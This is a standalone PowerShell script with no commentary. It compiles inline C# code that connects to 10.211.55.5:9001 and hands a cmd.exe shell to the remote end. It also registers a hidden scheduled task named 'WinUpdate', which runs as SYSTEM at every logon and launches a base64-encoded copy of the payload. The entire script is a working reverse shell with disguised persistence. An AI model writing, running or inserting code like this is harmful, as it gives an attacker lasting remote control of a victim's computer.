$c='using System;using System.Diagnostics;using System.IO;using System.Net.Sockets;public class S{public static void R(string i,int p){try{TcpClient c=new TcpClient(i,p);Stream s=c.GetStream();StreamReader r=new StreamReader(s);StreamWriter w=new StreamWriter(s);Process pr=new Process();pr.StartInfo.FileName="cmd.exe";pr.StartInfo.CreateNoWindow=true;pr.StartInfo.UseShellExecute=false;pr.StartInfo.RedirectStandardInput=pr.StartInfo.RedirectStandardOutput=pr.StartInfo.RedirectStandardError=true;pr.Start();StreamWriter iIn=pr.StandardInput;iIn.AutoFlush=true;new System.Threading.Thread(()=>{char[] b=new char[1024];int d;while((d=pr.StandardOutput.Read(b,0,1024))>0){w.Write(b,0,d);w.Flush();}}).Start();while(true){string l=r.ReadLine();if(l=="exit")break;iIn.WriteLine(l);}pr.Kill();c.Close();}catch{}}}';
Add-Type -TypeDefinition $c;
$ip="10.211.55.5";
$pt=9001;
$enc=[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Add-Type -TypeDefinition '$c';[S]::R('$ip',$pt)"));
$a=New-ScheduledTaskAction -Execute "powershell" -Argument "-w hidden -noni -enc $enc";
$t=New-ScheduledTaskTrigger -AtLogOn;
$p=New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount;
$s=New-ScheduledTaskSettingsSet -Hidden;
Register-ScheduledTask -Action $a -Trigger $t -Principal $p -Settings $s -TaskName "WinUpdate" -Force;
[S]::R($ip,$pt)
